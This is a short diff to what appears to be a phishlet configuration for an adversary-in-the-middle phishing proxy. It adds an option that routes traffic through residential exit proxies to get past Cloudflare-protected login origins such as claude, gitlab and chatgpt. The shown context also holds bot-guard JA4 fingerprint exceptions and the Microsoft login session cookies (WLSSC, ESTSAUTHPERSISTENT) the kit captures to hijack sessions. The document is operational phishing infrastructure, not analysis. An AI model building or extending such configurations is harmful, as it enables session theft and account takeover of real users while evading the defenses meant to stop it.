@@ -38,6 +38,10 @@ login:
 bg_ja4_allow:                       # optional: per-phishlet botguard JA4 exceptions
   - t13d1310c009130100              # (corporate TLS-inspection variants) — OR-merged
   - t13d1311c009130100              # with the node-level -bg-ja4 allowlist
+proxy: true                         # optional: force this phishlet's whole upstream
+                                    # through the node's exit proxy (residential) —
+                                    # for Cloudflare-protected origins that reject
+                                    # datacenter egress IPs (claude/gitlab/chatgpt/…)
 auth_tokens:
   - domain: login.live.com
     keys: ['WLSSC', 'ESTSAUTHPERSISTENT']    # cookie-set that completes a session
